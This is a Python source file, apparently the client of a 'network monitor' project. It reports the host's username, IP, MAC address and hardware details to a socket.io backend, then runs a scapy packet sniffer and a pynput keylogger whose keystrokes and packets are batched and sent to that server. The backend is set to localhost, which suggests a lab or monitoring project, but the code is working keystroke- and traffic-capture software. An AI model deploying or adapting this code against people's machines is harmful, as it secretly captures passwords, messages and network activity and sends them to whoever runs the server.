import atexit
import os
import socket
import requests
import socketio
from threading import Thread
import platform
import uuid
import subprocess
import re
from pynput import keyboard
from scapy.sendrecv import sniff

from recorder import handle_key_press, handle_key_release, send_batched_keystrokes
from sniffer import handle_sniffed_packets, send_batched_packets

HOST_IP = "127.0.0.1"
HOST_PORT = "3000"

BACKEND_URL = f"http://{HOST_IP}:{HOST_PORT}/api"

packets_buffer = []


def packets_thread_callback():
    send_batched_packets(sio)


def keystrokes_thread_callback():
    send_batched_keystrokes(BACKEND_URL)


def sniffer_thread_callback():
    sniff(prn=handle_sniffed_packets)


def on_exit():
    print("Disconnecting from server...")

    try:
        # TODO: try Disconnecting from network with data.
        sio.disconnect()
        print("Successfully Disconnected socket from server")
    except Exception as e:
        print(f"Failed Disconnecting socket from server {e}")


atexit.register(on_exit)


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(("89.207.132.170", 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = "127.0.0.1"
    finally:
        s.close()
    return IP


def get_pc_manufacturer():
    """Gets PC manufacturer; returns 'N/A' if unknown or not determinable."""
    system_os, manufacturer = platform.system(), None

    if system_os == "Windows":
        try:
            # WMIC output is CSV: Node,Vendor. We need Vendor.
            # Example: MYPC,Dell Inc.
            output = subprocess.check_output(
                ["wmic", "csproduct", "get", "vendor", "/FORMAT:CSV"],
                text=True,
                stderr=subprocess.DEVNULL,
            ).strip()
            lines = output.splitlines()
            # Second line should contain "Node,Vendor"
            if len(lines) > 1 and "," in lines[1]:
                # Split only on the first comma to handle cases where Node might have a comma (unlikely)
                vendor_part = lines[1].split(",", 1)[1].strip()
                if vendor_part:  # Check if vendor_part is not empty
                    manufacturer = vendor_part
        except (
            subprocess.CalledProcessError,
            FileNotFoundError,
            IndexError,
            Exception,
        ):
            # Catch specific errors related to subprocess or parsing, or any other exception
            pass
    elif system_os == "Linux":
        # Check DMI files for vendor information
        paths_to_check = [
            "/sys/class/dmi/id/sys_vendor",
            "/sys/class/dmi/id/board_vendor",
            "/sys/class/dmi/id/chassis_vendor",
        ]
        for path in paths_to_check:
            try:
                with open(path, "r") as f:
                    content = f.read().strip()
                    if content:  # Ensure content is not empty
                        manufacturer = content
                        break  # Found a manufacturer, no need to check other paths
            except (FileNotFoundError, IOError, Exception):
                # File might not exist, or other I/O error
                continue
    elif system_os == "Darwin":  # macOS
        try:
            # Use ioreg to get manufacturer information
            output = subprocess.check_output(
                ["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"],
                text=True,
                stderr=subprocess.DEVNULL,
            ).strip()
            # Regex to find "manufacturer" = <"Actual Manufacturer">
            match = re.search(
                r'"manufacturer"\s*=\s*<"([^"]+)">', output, re.IGNORECASE
            )
            if match:
                extracted_manufacturer = match.group(1).strip()
                if extracted_manufacturer:  # Ensure extracted value is not empty
                    manufacturer = extracted_manufacturer
        except (subprocess.CalledProcessError, FileNotFoundError, Exception):
            pass  # ioreg might fail or not be found (highly unlikely on macOS)

        # Fallback for macOS if ioreg doesn't provide a specific manufacturer
        if not manufacturer:
            manufacturer = "Apple Inc."

    if manufacturer:
        manufacturer = manufacturer.strip()  # Final strip
        # List of common placeholder strings indicating no actual data
        known_empty_placeholders = [
            "to be filled by o.e.m.",
            "o.e.m.",
            "not applicable",
            "none",
            "undefined",
            "default string",
            "not specified",
        ]
        # If the manufacturer is a known placeholder or empty after stripping, treat as not found
        if not manufacturer or manufacturer.lower() in known_empty_placeholders:
            manufacturer = None

    return manufacturer if manufacturer else "N/A"


def get_pc_model():
    """
    Attempts to retrieve the PC model on Windows, Linux, and macOS.
    Returns the model string if found, otherwise "Unknown".
    """
    system = platform.system()

    if system == "Windows":
        try:
            # Use wmic on Windows
            result = subprocess.run(
                ["wmic", "csproduct", "get", "name"],
                capture_output=True,
                text=True,
                check=True,
            )
            for line in result.stdout.splitlines():
                if "Name" not in line and line.strip():
                    return line.strip()
        except Exception:
            pass
    elif system == "Linux":
        try:
            # Try dmidecode on Linux
            result = subprocess.run(
                ["sudo", "dmidecode", "-s", "system-product-name"],
                capture_output=True,
                text=True,
                check=True,
            )
            return result.stdout.strip()
        except FileNotFoundError:
            # If dmidecode is not installed, try reading from /sys/class/dmi/id/
            try:
                with open("/sys/class/dmi/id/product_name", "r") as f:
                    return f.read().strip()
            except Exception:
                pass
        except Exception:
            pass
    elif system == "Darwin":  # macOS
        try:
            # Use system_profiler on macOS
            result = subprocess.run(
                ["system_profiler", "SPHardwareDataType"],
                capture_output=True,
                text=True,
                check=True,
            )
            for line in result.stdout.splitlines():
                if "Model Identifier:" in line:
                    return line.split(":")[1].strip()
        except Exception:
            pass

    return "Unknown"


if __name__ == "__main__":
    print("Initializing Socket Server")

    print("Attempting Socket connection")
    sio = socketio.Client()

    try:
        requests.get(f"{BACKEND_URL}/socket.io")
    except Exception:
        pass

    sio.connect(
        BACKEND_URL,
        socketio_path="/api/socket.io",
        transports=["websocket"],
        retry=True,
    )

    node = {
        "user": os.getlogin(),
        "name": platform.node(),
        "type": "workstation",
        # "hostname": socket.gethostname(),
        "ip": get_ip(),
        "mac": ":".join(
            ["{:02x}".format((uuid.getnode() >> i) & 0xFF) for i in range(0, 8 * 6, 8)][
                ::-1
            ]
        ),
        "os": platform.system() + "  " + platform.release(),
        "manufacturer": get_pc_manufacturer(),
        "model": get_pc_model(),
    }

    sio.emit("join", ["Nodes", node])

    print("Starting Network Monitor...")
    # Start various threads
    packets_thread = Thread(target=packets_thread_callback, daemon=True)
    sniffer_thread = Thread(target=sniffer_thread_callback, daemon=True)
    logger_thread = Thread(target=keystrokes_thread_callback, daemon=True)

    print("Starting Sniffer Thread")
    packets_thread.start()
    sniffer_thread.start()
    print("Starting Key Logger Thread")
    logger_thread.start()
    with keyboard.Listener(
        on_press=handle_key_press, on_release=handle_key_release
    ) as key_recorder:
        print("Listening to keylogs...")
        key_recorder.join()
